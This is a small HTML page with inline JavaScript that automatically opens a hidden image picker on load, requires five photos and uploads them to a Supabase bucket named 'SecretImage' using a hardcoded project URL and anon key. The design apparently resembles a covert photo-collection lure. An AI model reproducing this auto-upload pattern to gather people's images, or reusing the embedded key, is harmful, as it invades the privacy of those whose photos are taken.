<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Auto Upload to Supabase</title>
</head>
<body>

<input id="imagePicker" type="file" accept="image/*" multiple style="display:none" />

<script type="module">
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

// Supabase credentials
const SUPABASE_URL = 'https://nqtxeqbvxhtsiilgerkj.supabase.co';
const SUPABASE_ANON_KEY =
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xdHhlcWJ2eGh0c2lpbGdlcmtqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2OTQ5NzIsImV4cCI6MjA3ODI3MDk3Mn0.aL6O6kkHFAmmVlmU-ixE9Jkz61jgXAx6rlM3zHo_xnc';

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// Auto open image picker when page loads
window.addEventListener("load", () => {
  document.getElementById("imagePicker").click();
});

// On image selection
document.getElementById("imagePicker").addEventListener("change", async (event) => {
  const files = event.target.files;

  if (files.length < 5) {
    alert("Please select at least 5 images!");
    return;
  }

  // pick only first 5
  const selectedImages = Array.from(files).slice(0, 5);

  for (let file of selectedImages) {
    const fileName = `${Date.now()}_${file.name}`; // unique name
    const blob = file;

    const { data, error } = await supabase.storage
      .from('SecretImage')
      .upload(fileName, blob, { contentType: 'image/jpeg' });

    if (error) {
      console.error("Upload error:", error);
    } else {
      console.log("Uploaded:", data);
    }
  }

  alert("5 images uploaded successfully!");
});
</script>

</body>
</html>
